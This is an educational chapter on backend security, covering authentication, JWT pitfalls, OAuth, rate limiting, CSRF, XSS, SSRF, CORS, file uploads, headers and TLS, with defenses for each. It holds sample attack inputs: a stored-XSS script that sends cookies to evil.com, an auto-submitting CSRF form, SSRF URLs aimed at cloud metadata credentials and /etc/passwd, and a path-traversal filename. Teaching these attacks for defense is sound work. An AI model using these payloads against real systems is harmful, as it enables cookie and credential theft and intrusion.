---
title: "Chapter 5 — Backend Security (Deep Dive)"
---

# Chapter 5 — Backend Security (Deep Dive)

## 5.1 Authentication — How It Really Works

### Password Authentication Flow

```
    REGISTRATION FLOW
    ═══════════════════════════════════════════════════════

    User                      Server                      Database
    ────                      ──────                      ────────
    POST /register
    {email, password}
         │
         │────────────────▶  1. Validate input
         │                      - Email format
         │                      - Password length ≥ 12
         │                      - Check breached passwords (HaveIBeenPwned API)
         │
         │                   2. Generate salt (16 random bytes)
         │
         │                   3. Hash: bcrypt(password + salt, cost=12)
         │                      ┌──────────────────────────────────────┐
         │                      │ bcrypt internals:                    │
         │                      │ - Derives 128-bit key from password  │
         │                      │ - Uses Blowfish cipher               │
         │                      │ - Iterates 2^cost times (2^12=4096)  │
         │                      │ - Cost=12 takes ~250ms per hash      │
         │                      │ - Output includes salt + hash         │
         │                      │ - $2b$12$salt22chars.hash31chars     │
         │                      └──────────────────────────────────────┘
         │
         │                   4. Store hash ──────────────────────────▶ INSERT INTO users
         │                                                             (email, password_hash)
         │◀────────────────  5. Return 201 Created


    LOGIN FLOW
    ═══════════════════════════════════════════════════════

    User                      Server                      Database
    ────                      ──────                      ────────
    POST /login
    {email, password}
         │
         │────────────────▶  1. Fetch user ──────────────────────────▶ SELECT password_hash
         │                      by email                                FROM users
         │                                                              WHERE email = $1
         │                   ◀──────────────────────────────────────── Return hash
         │
         │                   2. bcrypt.verify(password, stored_hash)
         │                      - Extracts salt from stored hash
         │                      - Hashes input password with same salt
         │                      - Constant-time comparison
         │                        (prevents timing attacks)
         │
         │                   3. If match:
         │                      - Generate session/JWT
         │                      - Log successful auth
         │                   If no match:
         │                      - Return generic error
         │                        "Invalid email or password"
         │                        (don't reveal which was wrong!)
         │                      - Rate limit: track failed attempts
         │                      - After 5 failures: require CAPTCHA
         │                      - After 10: temporary lockout
         │
         │◀────────────────  4. Return token/session
```

### Why bcrypt/scrypt/Argon2id, Not SHA-256

```
    ATTACK: Offline brute force on stolen password hashes

    SHA-256:
    ┌──────────────────────────────────────────────────────┐
    │  Speed: ~10 BILLION hashes/second (GPU)              │
    │                                                      │
    │  8-char password (lowercase + digits):               │
    │  36^8 = 2.8 trillion combinations                    │
    │  Time: 2.8T / 10B = 280 seconds (< 5 minutes!)      │
    │                                                      │
    │  Even with salt, every hash attempt is ~100 ns.      │
    └──────────────────────────────────────────────────────┘

    bcrypt (cost=12):
    ┌──────────────────────────────────────────────────────┐
    │  Speed: ~2,000 hashes/second (GPU)                   │
    │                                                      │
    │  Same 8-char password:                               │
    │  2.8T / 2K = 1.4 billion seconds = 44 YEARS          │
    │                                                      │
    │  Each hash takes ~250ms (intentionally slow).        │
    │  Cost factor can be increased as hardware improves.  │
    └──────────────────────────────────────────────────────┘

    Argon2id (recommended for new systems):
    ┌──────────────────────────────────────────────────────┐
    │  Memory-hard: requires ~64MB RAM per hash attempt    │
    │  GPU has fast cores but limited memory per core      │
    │  Can't parallelize thousands of attempts             │
    │                                                      │
    │  Parameters: time=3, memory=65536KB, parallelism=4   │
    │  ~400ms per hash on server                           │
    │  GPU advantage reduced from 1000x to ~5x             │
    └──────────────────────────────────────────────────────┘
```

---

## 5.2 JWT (JSON Web Tokens) — Internals

### JWT Structure

```
    eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.    ← Header (base64url)
    eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik    ← Payload (base64url)
    pvaG4iLCJpYXQiOjE3MDAwMDAwMDB9.
    SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQ    ← Signature
    ssw5c

    DECODED:

    Header:
    {
      "alg": "RS256",        // Algorithm: RSA + SHA-256
      "typ": "JWT",          // Token type
      "kid": "key-2024-01"   // Key ID (for key rotation)
    }

    Payload:
    {
      "sub": "user-42",          // Subject (user ID)
      "name": "Alice",           // Custom claim
      "role": "admin",           // Custom claim
      "iat": 1700000000,         // Issued at (Unix timestamp)
      "exp": 1700003600,         // Expires at (1 hour later)
      "iss": "auth.example.com", // Issuer
      "aud": "api.example.com",  // Audience
      "jti": "unique-token-id"   // JWT ID (for revocation)
    }

    Signature:
    RS256(
      base64url(header) + "." + base64url(payload),
      private_key
    )
```

### JWT Verification Flow

```
    ┌──────────┐                     ┌───────────────┐
    │  Client  │                     │  API Server   │
    └────┬─────┘                     └───────┬───────┘
         │                                   │
         │  GET /api/data                    │
         │  Authorization: Bearer eyJhbG...  │
         │ ─────────────────────────────────▶│
         │                                   │
         │                          1. Split token into 3 parts
         │                          2. Decode header → get algorithm
         │                          3. Verify signature:
         │                             RS256.verify(
         │                               header + "." + payload,
         │                               signature,
         │                               public_key  ← from JWKS endpoint
         │                             )
         │                          4. Check claims:
         │                             - exp > now? (not expired)
         │                             - iss = "auth.example.com"? (right issuer)
         │                             - aud = "api.example.com"? (right audience)
         │                          5. Extract user info from payload
         │                          6. Proceed with request
         │                                   │
         │  200 OK {data}                    │
         │ ◀─────────────────────────────────│
```

### JWT Security Pitfalls

```
    PITFALL 1: Algorithm Confusion Attack
    ═══════════════════════════════════════════════════════

    Server expects RS256 (asymmetric: private key signs, public key verifies)

    Attacker:
    1. Gets the server's public key (it's public!)
    2. Creates a JWT with {"alg": "HS256"} (symmetric: same key signs AND verifies)
    3. Signs the JWT using the public key as the HMAC secret
    4. Server sees alg=HS256, uses "public key" as HMAC secret → signature valid!

    Prevention:
    - NEVER allow the JWT header to dictate the algorithm
    - Hardcode the expected algorithm in verification:
      jwt.verify(token, publicKey, { algorithms: ['RS256'] })  // ✓
      jwt.verify(token, publicKey)  // ✗ Trusts header's alg claim


    PITFALL 2: No Revocation
    ═══════════════════════════════════════════════════════

    JWTs are stateless. Once issued, they're valid until expiry.
    User logs out → JWT is still valid.
    User is banned → JWT is still valid.
    Token is stolen → JWT is still valid.

    Solutions:
    1. Short-lived access tokens (5-15 minutes)
       + Refresh tokens (days/weeks, stored server-side, revocable)

    2. Token blocklist (check JTI against Redis on every request)
       - Adds a database lookup, partially defeating the "stateless" benefit

    3. Token versioning (store version in user table, increment on logout)
       - Lightweight check: if token.version != user.token_version → reject


    PITFALL 3: Storing Sensitive Data in Payload
    ═══════════════════════════════════════════════════════

    JWT payload is NOT encrypted — it's just base64url encoded.
    Anyone can decode it: atob("eyJzdWIiOi...") → plaintext JSON

    ✗ Don't store: passwords, SSNs, credit cards, API keys
    ✓ Do store: user ID, role, permissions, expiry


    PITFALL 4: Token Storage in Browser
    ═══════════════════════════════════════════════════════

    localStorage:
    ✗ Accessible to ANY JavaScript on the page (XSS vulnerable)
    ✗ If attacker injects script, they steal the token

    httpOnly cookie:
    ✓ Not accessible to JavaScript (XSS can't read it)
    ✓ Automatically sent with requests
    ✗ Vulnerable to CSRF (need SameSite + CSRF token)

    Recommendation:
    Access token → httpOnly, Secure, SameSite=Strict cookie
    Refresh token → httpOnly, Secure, SameSite=Strict cookie + separate path
```

---

## 5.3 Session vs. Token Authentication

```
    SESSION-BASED                          TOKEN-BASED (JWT)
    ═════════════════                      ═════════════════

    ┌────────┐  session_id  ┌────────┐    ┌────────┐   JWT    ┌────────┐
    │ Client │ ──cookie───▶ │ Server │    │ Client │ ──────▶  │ Server │
    └────────┘              └───┬────┘    └────────┘          └────────┘
                                │                          No server state!
                          ┌─────▼─────┐                    Token contains
                          │  Session  │                    all user info
                          │  Store    │
                          │ (Redis)   │
                          └───────────┘

    SESSION PROS:                          TOKEN PROS:
    ✓ Easy revocation (delete session)     ✓ Stateless (no server storage)
    ✓ Small cookie size (~32 bytes)        ✓ Works across domains/services
    ✓ Server controls all data             ✓ No shared session store needed
    ✓ Can't be decoded by client           ✓ Mobile-friendly
                                           ✓ Microservices-friendly

    SESSION CONS:                          TOKEN CONS:
    ✗ Requires shared session store        ✗ Can't revoke until expiry
    ✗ Sticky sessions or central store     ✗ Larger payload (~1KB+)
    ✗ Doesn't work well cross-domain       ✗ Payload is readable (not secret)
    ✗ Scaling session store is complex     ✗ Must handle refresh flow

    WHEN TO USE SESSIONS:                  WHEN TO USE TOKENS:
    - Traditional web apps                 - SPAs and mobile apps
    - Server-rendered pages                - Microservices
    - Simple deployment (monolith)         - Cross-domain auth
    - Need instant revocation              - Stateless scaling
```

---

## 5.4 OAuth 2.0 Flow

### Authorization Code Flow (Most Secure for Web Apps)

```
    ┌──────────┐          ┌──────────────┐          ┌─────────────┐
    │  User    │          │  Your App    │          │  OAuth       │
    │ (Browser)│          │ (Backend)    │          │  Provider    │
    └────┬─────┘          └──────┬───────┘          │ (Google,     │
         │                       │                  │  GitHub)     │
         │                       │                  └──────┬──────┘
         │  1. Click "Login      │                         │
         │     with Google"      │                         │
         │ ─────────────────────▶│                         │
         │                       │                         │
         │  2. Redirect to Google│                         │
         │ ◀─────────────────────│                         │
         │  302 → https://accounts.google.com/oauth/authorize
         │        ?client_id=YOUR_CLIENT_ID
         │        &redirect_uri=https://yourapp.com/callback
         │        &response_type=code
         │        &scope=openid email profile
         │        &state=random_csrf_token    ← CSRF protection!
         │                                                 │
         │  3. User sees Google consent screen             │
         │ ────────────────────────────────────────────────▶│
         │                                                 │
         │  4. User clicks "Allow"                         │
         │                                                 │
         │  5. Google redirects back with auth code         │
         │ ◀───────────────────────────────────────────────│
         │  302 → https://yourapp.com/callback
         │        ?code=AUTH_CODE_HERE
         │        &state=random_csrf_token
         │                       │                         │
         │ ─────────────────────▶│                         │
         │                       │                         │
         │                       │  6. Exchange code for   │
         │                       │     tokens (server-side)│
         │                       │  POST /oauth/token      │
         │                       │  {code, client_secret,  │
         │                       │   redirect_uri}         │
         │                       │ ───────────────────────▶│
         │                       │                         │
         │                       │  7. Receive tokens      │
         │                       │ ◀───────────────────────│
         │                       │  {access_token,         │
         │                       │   refresh_token,        │
         │                       │   id_token}             │
         │                       │                         │
         │                       │  8. Get user info       │
         │                       │  GET /userinfo          │
         │                       │  Authorization: Bearer  │
         │                       │ ───────────────────────▶│
         │                       │ ◀───────────────────────│
         │                       │  {email, name, ...}     │
         │                       │                         │
         │  9. Create session    │                         │
         │     Set cookie        │                         │
         │ ◀─────────────────────│                         │
         │  Set-Cookie: session=...                        │


    WHY THIS FLOW IS SECURE:
    ═══════════════════════════════════════════════════════
    - Auth code is short-lived (seconds)
    - Auth code is exchanged server-side (client_secret never exposed)
    - state parameter prevents CSRF attacks
    - Tokens never touch the browser (except id_token)
    - Access token stored server-side
```

### PKCE (Proof Key for Code Exchange) — For SPAs and Mobile

```
    Problem: SPAs and mobile apps can't keep client_secret secret.
    Solution: PKCE adds a dynamic challenge instead.

    1. App generates random code_verifier (43-128 chars)
    2. Derives code_challenge = SHA256(code_verifier) → base64url
    3. Sends code_challenge with auth request
    4. When exchanging code, sends code_verifier
    5. Server verifies: SHA256(code_verifier) == stored code_challenge

    Even if attacker intercepts the auth code, they can't exchange it
    without the code_verifier (which never left the app).
```

---

## 5.5 Rate Limiting — Algorithms

### Token Bucket

```
    ┌──────────────────────────────────────────────────┐
    │                TOKEN BUCKET                       │
    │                                                  │
    │  Bucket capacity: 10 tokens                      │
    │  Refill rate: 2 tokens/second                    │
    │                                                  │
    │  ┌─────────────────────┐                         │
    │  │ ● ● ● ● ● ● ● ○ ○ ○│  7 tokens available    │
    │  └─────────────────────┘                         │
    │          ▲                    │                   │
    │          │ +2/sec             │ -1 per request    │
    │                                                  │
    │  Request arrives:                                │
    │  - If tokens > 0: allow, remove 1 token          │
    │  - If tokens = 0: reject (429 Too Many Requests) │
    │                                                  │
    │  Allows bursts up to bucket capacity.            │
    │  Smooths out over time to refill rate.           │
    └──────────────────────────────────────────────────┘
```

### Sliding Window Log

```
    ┌──────────────────────────────────────────────────┐
    │           SLIDING WINDOW LOG                     │
    │                                                  │
    │  Window: 60 seconds, Limit: 100 requests         │
    │                                                  │
    │  Sorted set of request timestamps:               │
    │  [10:00:01, 10:00:03, 10:00:05, ..., 10:00:58]  │
    │                                                  │
    │  New request at 10:01:02:                        │
    │  1. Remove entries older than 10:00:02           │
    │  2. Count remaining entries                      │
    │  3. If count < 100: allow, add timestamp         │
    │  4. If count >= 100: reject                      │
    │                                                  │
    │  Redis implementation:                           │
    │  ZADD rate:user42 timestamp timestamp            │
    │  ZREMRANGEBYSCORE rate:user42 0 (now - 60s)      │
    │  ZCARD rate:user42                               │
    │                                                  │
    │  Pro: Precise, no boundary issues                │
    │  Con: Memory-intensive (stores every timestamp)  │
    └──────────────────────────────────────────────────┘
```

### Sliding Window Counter (Best Tradeoff)

```
    ┌──────────────────────────────────────────────────┐
    │        SLIDING WINDOW COUNTER                    │
    │                                                  │
    │  Combines fixed window counts with interpolation │
    │                                                  │
    │  Window: 60s, Limit: 100                         │
    │                                                  │
    │  Previous window (10:00-10:01): 80 requests      │
    │  Current window  (10:01-10:02): 30 requests      │
    │  Current time: 10:01:45 (75% through window)     │
    │                                                  │
    │  Estimated count =                               │
    │    current_count + prev_count × (1 - elapsed%)   │
    │  = 30 + 80 × (1 - 0.75)                         │
    │  = 30 + 20                                       │
    │  = 50                                            │
    │                                                  │
    │  50 < 100 → ALLOW                                │
    │                                                  │
    │  Pro: Memory efficient (just 2 counters)         │
    │  Pro: No boundary burst problem                  │
    │  Con: Approximate (but close enough in practice) │
    └──────────────────────────────────────────────────┘
```

### Rate Limiting Architecture

```
    ┌──────────┐     ┌──────────────┐     ┌──────────┐     ┌──────────┐
    │ Clients  │────▶│ API Gateway  │────▶│ Rate     │────▶│ Backend  │
    │          │     │              │     │ Limiter  │     │ Servers  │
    └──────────┘     └──────────────┘     └─────┬────┘     └──────────┘
                                                │
                                          ┌─────▼────┐
                                          │  Redis   │
                                          │ (shared  │
                                          │  state)  │
                                          └──────────┘

    Rate limit by:
    - IP address (basic, can be bypassed with proxies)
    - API key (better, tracks actual users)
    - User ID (after authentication)
    - Endpoint (different limits for different routes)
    - Combination (per-user per-endpoint)

    Response headers:
    X-RateLimit-Limit: 100
    X-RateLimit-Remaining: 45
    X-RateLimit-Reset: 1700003600  (Unix timestamp)
    Retry-After: 30  (seconds, only on 429 response)
```

---

## 5.6 CSRF Protection

```
    CSRF ATTACK FLOW
    ═══════════════════════════════════════════════════════

    1. User is logged into bank.com (has session cookie)
    2. User visits evil.com
    3. evil.com has hidden form:

       <form action="https://bank.com/transfer" method="POST">
         <input type="hidden" name="to" value="attacker_account">
         <input type="hidden" name="amount" value="10000">
       </form>
       <script>document.forms[0].submit();</script>

    4. Browser automatically attaches bank.com cookies
    5. bank.com sees valid session → processes transfer!

    ┌──────────┐                 ┌──────────┐              ┌──────────┐
    │  User    │ visits          │ evil.com │ auto-submit  │ bank.com │
    │ (logged  │ ──────────────▶ │          │ ────────────▶│          │
    │  into    │                 │ hidden   │ with user's  │ transfer │
    │  bank)   │                 │ form     │ cookies!     │ executes!│
    └──────────┘                 └──────────┘              └──────────┘


    DEFENSE 1: CSRF Token (Synchronizer Token Pattern)
    ═══════════════════════════════════════════════════════

    1. Server generates random token, stores in session
    2. Token embedded in every form as hidden field
    3. On POST, server checks: does token match session?
    4. evil.com can't read the token (same-origin policy)

    <form action="/transfer" method="POST">
      <input type="hidden" name="csrf_token" value="a1b2c3d4...">
      <input name="to" value="">
      <input name="amount" value="">
    </form>

    Server validates: request.csrf_token == session.csrf_token


    DEFENSE 2: SameSite Cookies (Modern, Recommended)
    ═══════════════════════════════════════════════════════

    Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

    SameSite=Strict:  Cookie NEVER sent on cross-site requests
    SameSite=Lax:     Cookie sent on top-level navigation GET only
    SameSite=None:    Cookie sent everywhere (must also set Secure)

    With SameSite=Strict:
    evil.com submits form to bank.com → cookie NOT attached → request fails


    DEFENSE 3: Double-Submit Cookie
    ═══════════════════════════════════════════════════════

    1. Set a random CSRF token in a non-httpOnly cookie
    2. JavaScript reads cookie and adds token as request header
    3. Server checks: cookie value == header value
    4. Attacker can't read the cookie (same-origin) so can't set the header
```

---

## 5.7 XSS (Cross-Site Scripting) Prevention

```
    XSS TYPES
    ═══════════════════════════════════════════════════════

    STORED XSS (most dangerous):
    ┌──────────┐  Inject script    ┌──────────┐  Store     ┌──────────┐
    │ Attacker │ ────────────────▶ │  Server  │ ─────────▶ │ Database │
    └──────────┘  via comment form └──────────┘            └──────────┘
                                       │
    Later, other users view the page:  │
    ┌──────────┐  Serves stored    ┌───▼──────┐
    │  Victim  │ ◀──────────────── │  Server  │
    └──────────┘  script in HTML   └──────────┘
    Script runs in victim's browser → steals cookies, redirects, etc.

    Example:
    Comment: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
    If server renders this without escaping: script executes for every viewer.


    REFLECTED XSS:
    Attacker crafts URL: https://example.com/search?q=<script>alert(1)</script>
    Server reflects input into page without escaping.
    Attacker sends URL to victim via email/social media.


    DOM-BASED XSS:
    Client-side JavaScript takes user input and inserts it into DOM unsafely.
    document.getElementById('output').innerHTML = location.hash.slice(1);
    URL: https://example.com/#<img src=x onerror=alert(1)>


    DEFENSES
    ═══════════════════════════════════════════════════════

    1. OUTPUT ENCODING (primary defense)
       HTML context:   < → &lt;   > → &gt;   & → &amp;   " → &quot;
       JS context:     Use JSON.stringify() for data in <script> blocks
       URL context:    encodeURIComponent() for URL parameters
       CSS context:    Whitelist allowed values

    2. CONTENT SECURITY POLICY (defense in depth)
       Content-Security-Policy: default-src 'self';
         script-src 'self' 'nonce-abc123';
         style-src 'self' 'unsafe-inline';
         img-src 'self' data:;
         connect-src 'self' api.example.com;

       Even if XSS payload is injected, CSP prevents:
       - Loading scripts from external domains
       - Inline scripts (unless they have the nonce)
       - Connecting to attacker's server

    3. HttpOnly COOKIES
       Set-Cookie: session=abc; HttpOnly
       JavaScript cannot read httpOnly cookies.
       XSS can't steal session cookies directly.

    4. INPUT VALIDATION
       Don't try to "sanitize" HTML (it's nearly impossible to get right).
       Instead: reject unexpected input formats.
       - Email field should be an email
       - Numeric field should be a number
       - Use allowlists, not denylists
```

---

## 5.8 SSRF (Server-Side Request Forgery)

```
    SSRF ATTACK FLOW
    ═══════════════════════════════════════════════════════

    Application has "fetch URL" feature (e.g., URL preview, webhook, PDF generation):

    Normal use:
    POST /api/fetch-url
    {"url": "https://example.com/article"}
    → Server fetches the URL and returns content. Fine.

    SSRF attack:
    POST /api/fetch-url
    {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
    → Server fetches AWS metadata endpoint!
    → Returns IAM credentials to attacker!

    ┌──────────┐                ┌──────────┐                ┌──────────────┐
    │ Attacker │  malicious URL │  Your    │  HTTP GET      │ Internal     │
    │          │ ──────────────▶│  Server  │ ──────────────▶│ Service      │
    │          │                │          │                │ (metadata,   │
    │          │ ◀──────────────│          │ ◀──────────────│  database,   │
    │          │  internal data │          │  response      │  admin panel)│
    └──────────┘                └──────────┘                └──────────────┘

    COMMON SSRF TARGETS:
    - http://169.254.169.254/ (AWS/GCP metadata)
    - http://localhost:6379/ (Redis — can execute commands!)
    - http://internal-admin.corp/ (internal services)
    - file:///etc/passwd (local file read)
    - http://127.0.0.1:5432/ (PostgreSQL)


    DEFENSES
    ═══════════════════════════════════════════════════════

    1. URL VALIDATION (allowlist approach)
       - Parse URL into components
       - Resolve hostname to IP (before making request)
       - Check IP is NOT in private ranges:
         10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16,
         127.0.0.0/8, 169.254.0.0/16, ::1
       - Check scheme is https only (block file://, gopher://, etc.)
       - Don't rely on hostname checks alone (DNS rebinding!)

    2. NETWORK SEGMENTATION
       - Application server cannot reach metadata endpoint
       - Use IMDSv2 (requires token-based access to metadata)
       - Firewall rules: app server can only reach allowed IPs

    3. DEDICATED FETCH SERVICE
       - Isolate URL fetching into a separate, sandboxed service
       - Service runs with minimal network access
       - Cannot reach internal infrastructure
```

---

## 5.9 CORS (Cross-Origin Resource Sharing)

```
    WHY CORS EXISTS
    ═══════════════════════════════════════════════════════

    Same-Origin Policy: Browser blocks JavaScript from making requests
    to a different origin (protocol + domain + port).

    https://app.example.com → https://api.example.com  ← BLOCKED by default
    (different subdomain = different origin)

    CORS lets the API server say "I allow requests from app.example.com."


    CORS FLOW (Preflight Request)
    ═══════════════════════════════════════════════════════

    Browser                             API Server
    ───────                             ──────────
    1. JavaScript: fetch('https://api.example.com/data')

    2. Browser sends preflight (OPTIONS):
       OPTIONS /data
       Origin: https://app.example.com
       Access-Control-Request-Method: POST
       Access-Control-Request-Headers: Content-Type, Authorization
                    │
                    ▼
    3. Server responds with allowed origins:
       Access-Control-Allow-Origin: https://app.example.com
       Access-Control-Allow-Methods: GET, POST, PUT
       Access-Control-Allow-Headers: Content-Type, Authorization
       Access-Control-Max-Age: 86400  (cache preflight for 24h)
                    │
                    ▼
    4. Browser checks: origin matches? methods match? headers match?
       If yes → sends actual request
       If no → blocks request, JavaScript gets error

    5. Actual request:
       POST /data
       Origin: https://app.example.com
       Content-Type: application/json
       Authorization: Bearer eyJ...
                    │
                    ▼
    6. Server response:
       Access-Control-Allow-Origin: https://app.example.com
       {data: ...}


    CORS MISCONFIGURATIONS (Security Risks)
    ═══════════════════════════════════════════════════════

    ✗ Access-Control-Allow-Origin: *
      With credentials → browser blocks (good)
      Without credentials → any site can read response (bad for sensitive data)

    ✗ Reflecting Origin header without validation:
      Origin: https://evil.com → Allow-Origin: https://evil.com
      Attacker's site can now read your API responses!

    ✗ Access-Control-Allow-Origin: null
      Can be exploited via sandboxed iframes

    ✓ Correct: Allowlist of specific origins
      if request.origin in ['https://app.example.com', 'https://admin.example.com']:
          response.headers['Access-Control-Allow-Origin'] = request.origin
```

---

## 5.10 Input Validation

```
    INPUT VALIDATION STRATEGY
    ═══════════════════════════════════════════════════════

    Layer 1: Client-side validation (UX only, NOT security)
    ┌────────────────────────────────────────────────┐
    │  HTML: <input type="email" required>           │
    │  JS: if (!isValidEmail(input)) showError()     │
    │                                                │
    │  Can be bypassed by: curl, Postman, browser    │
    │  devtools, proxy tools (Burp Suite)            │
    │  NEVER trust client-side validation for security│
    └────────────────────────────────────────────────┘

    Layer 2: API-level validation (REQUIRED for security)
    ┌────────────────────────────────────────────────┐
    │  Schema validation (JSON Schema, Zod, Pydantic)│
    │                                                │
    │  # Pydantic example                            │
    │  class CreateUser(BaseModel):                  │
    │      email: EmailStr                           │
    │      name: str = Field(min_length=1,           │
    │                        max_length=100)         │
    │      age: int = Field(ge=0, le=150)            │
    │                                                │
    │  Rejects: {"email": "not-email", "age": -1}    │
    └────────────────────────────────────────────────┘

    Layer 3: Business logic validation
    ┌────────────────────────────────────────────────┐
    │  - Does the referenced resource exist?         │
    │  - Does the user have permission?              │
    │  - Is the operation logically valid?            │
    │    (e.g., can't book a meeting in the past)    │
    └────────────────────────────────────────────────┘

    Layer 4: Database constraints (last line of defense)
    ┌────────────────────────────────────────────────┐
    │  NOT NULL, UNIQUE, CHECK constraints,          │
    │  foreign keys, enum types                      │
    │                                                │
    │  CHECK (age >= 0 AND age <= 150)               │
    │  UNIQUE (email)                                │
    └────────────────────────────────────────────────┘


    VALIDATION RULES
    ═══════════════════════════════════════════════════════

    ✓ ALLOWLIST (accept known good):
      Allowed statuses: ['active', 'inactive', 'pending']
      if status not in ALLOWED_STATUSES: reject

    ✗ DENYLIST (reject known bad):
      Blocked chars: ['<', '>', 'script']
      Always incomplete — attacker finds what you missed

    ✓ Type coercion with strict parsing:
      int("42") → 42 ✓
      int("42; DROP TABLE") → error ✓

    ✓ Length limits on ALL string inputs:
      name: max 100 chars
      bio: max 5000 chars
      No field should accept unbounded input

    ✓ Request size limits:
      Max body: 1MB (or appropriate for your use case)
      Max file upload: configured per endpoint
```

---

## 5.11 File Upload Security

```
    ATTACK VECTORS
    ═══════════════════════════════════════════════════════

    1. Executable upload:
       User uploads "image.php" → server stores in web root
       → Attacker visits /uploads/image.php → PHP executes → RCE!

    2. Path traversal:
       Filename: "../../../etc/cron.d/backdoor"
       If server uses filename directly → writes to system directory

    3. Content-type mismatch:
       File claims to be image/jpeg but contains HTML with JavaScript
       Browser renders as HTML → XSS

    4. Zip bomb:
       10KB compressed file that expands to 10GB → disk exhaustion

    5. ImageTragick (CVE-2016-3714):
       Malicious image file triggers command execution in ImageMagick


    DEFENSES
    ═══════════════════════════════════════════════════════

    ┌──────────────────────────────────────────────────────────┐
    │  ✓ Generate new random filename (UUID)                   │
    │    NEVER use the original filename for storage           │
    │                                                          │
    │  ✓ Store outside web root (or in object storage like S3) │
    │    Serve via application endpoint, not direct URL         │
    │                                                          │
    │  ✓ Validate content type by reading file magic bytes     │
    │    Don't trust Content-Type header                       │
    │    file_type = magic.from_buffer(file.read(2048))        │
    │                                                          │
    │  ✓ Set file size limits                                  │
    │    Max 5MB for images, 50MB for documents                │
    │                                                          │
    │  ✓ Scan for malware (ClamAV)                             │
    │                                                          │
    │  ✓ Re-encode images (strips metadata and payloads)       │
    │    img = Image.open(upload); img.save(output, 'PNG')     │
    │                                                          │
    │  ✓ Set Content-Disposition: attachment for downloads      │
    │    Prevents browser from rendering potentially harmful    │
    │    content inline                                        │
    │                                                          │
    │  ✓ Serve from a different domain (e.g., cdn.example.com) │
    │    Isolates from main application cookies                │
    └──────────────────────────────────────────────────────────┘
```

---

## 5.12 Security Headers Summary

```
    ┌───────────────────────────────┬──────────────────────────────────────────┐
    │ Header                        │ Purpose & Recommended Value              │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ Strict-Transport-Security     │ Force HTTPS for all future requests      │
    │ (HSTS)                        │ max-age=31536000; includeSubDomains;     │
    │                               │ preload                                  │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ Content-Security-Policy       │ Control resource loading sources         │
    │ (CSP)                         │ default-src 'self'; script-src 'self'    │
    │                               │ 'nonce-{random}'                         │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ X-Content-Type-Options        │ Prevent MIME sniffing                    │
    │                               │ nosniff                                  │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ X-Frame-Options               │ Prevent clickjacking                    │
    │                               │ DENY or SAMEORIGIN                       │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ Referrer-Policy               │ Control referrer information             │
    │                               │ strict-origin-when-cross-origin          │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ Permissions-Policy            │ Disable browser features                 │
    │                               │ camera=(), microphone=(),                │
    │                               │ geolocation=()                           │
    ├───────────────────────────────┼──────────────────────────────────────────┤
    │ Cache-Control                 │ Control caching of sensitive responses   │
    │                               │ no-store, private (for auth responses)   │
    └───────────────────────────────┴──────────────────────────────────────────┘
```

---

## 5.13 TLS (Transport Layer Security)

```
    TLS 1.3 HANDSHAKE (simplified)
    ═══════════════════════════════════════════════════════

    Client                                    Server
    ──────                                    ──────

    1. ClientHello
       - Supported cipher suites
       - Random number
       - Key share (Diffie-Hellman public key)
    ─────────────────────────────────────────▶

    2. ServerHello + Certificate + Finished
       - Chosen cipher suite
       - Random number
       - Key share (DH public key)
       - Certificate (proves server identity)
       - Encrypted Finished message
    ◀─────────────────────────────────────────

    Both derive shared secret from DH exchange.
    Data is now encrypted.

    3. Client Finished (encrypted)
    ─────────────────────────────────────────▶

    Total: 1 round trip (vs 2 in TLS 1.2)
    0-RTT resumption for repeat connections.


    WHAT CAN GO WRONG
    ═══════════════════════════════════════════════════════

    - Expired certificates → connection refused
    - Self-signed certificates → man-in-the-middle possible
    - TLS 1.0/1.1 → known vulnerabilities (BEAST, POODLE)
    - Weak cipher suites → can be broken
    - Missing HSTS → first request can be intercepted (SSL stripping)
    - Not checking certificate in client code:
      verify=False  # ✗ NEVER do this in production
```
